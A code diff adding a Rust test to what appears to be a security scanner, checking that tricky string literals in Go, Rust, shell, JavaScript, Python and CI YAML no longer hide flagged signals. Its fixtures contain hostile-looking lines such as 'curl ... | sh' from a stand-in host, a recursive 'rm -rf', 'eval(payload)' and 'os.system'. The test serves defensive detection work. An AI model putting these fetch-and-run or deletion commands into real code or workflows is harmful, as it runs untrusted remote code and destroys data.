@@ -1372,6 +1372,111 @@ mod tests {
         );
     }
 
+    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
+    /// scanner misread hid the evidence after it. Each control (the same code without the
+    /// construct) found it before the fix too.
+    #[test]
+    fn strings_the_scanner_misread_no_longer_hide_evidence() {
+        let go = |raw: &str| {
+            added(
+                "main.go",
+                &[
+                    "func clean() error {",
+                    &format!("\tmatches, _ := filepath.Glob({raw})"),
+                    "\t_, _ = http.Get(\"https://e.x/report\")",
+                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
+                    "}",
+                ],
+            )
+        };
+        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
+            assert_eq!(
+                signals(&go(raw)),
+                [S::NetworkFetch, S::ProcessSpawn],
+                "{raw}"
+            );
+        }
+        for (path, lines, signal) in [
+            (
+                "main.go",
+                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
+                S::ProcessSpawn,
+            ),
+            (
+                "main.go",
+                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
+                S::ProcessSpawn,
+            ),
+            (
+                "src/lib.rs",
+                &[
+                    r#"const S: &str = ""#,
+                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
+                ],
+                S::UnsafeAdded,
+            ),
+            (
+                "x.sh",
+                &[
+                    r#"MSG="hello"#,
+                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
+                ],
+                S::NetworkFetch,
+            ),
+            (
+                "x.js",
+                &["const tpl = `", "`; eval(payload); const t = `x`;"],
+                S::DynamicEval,
+            ),
+            (
+                "x.py",
+                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
+                S::ProcessSpawn,
+            ),
+            (
+                "src/lib.rs",
+                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
+                S::UnsafeAdded,
+            ),
+        ] {
+            assert!(
+                signals(&added(path, lines)).contains(&signal),
+                "{path}: {lines:?}"
+            );
+        }
+        for (lines, signal) in [
+            (
+                &[
+                    "      - run: |",
+                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
+                ][..],
+                S::NetworkFetch,
+            ),
+            (
+                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
+                S::NetworkFetch,
+            ),
+            (
+                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
+                S::CiPrivilege,
+            ),
+        ] {
+            assert_eq!(
+                signals(&added(".github/workflows/ci.yml", lines)),
+                [signal],
+                "{lines:?}"
+            );
+        }
+        // A YAML comment is still a comment.
+        assert_eq!(
+            signals(&added(
+                ".github/workflows/ci.yml",
+                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
+            )),
+            []
+        );
+    }
+
     #[test]
     fn build_scripts_and_install_hooks_are_build_hooks() {
         assert_eq!(
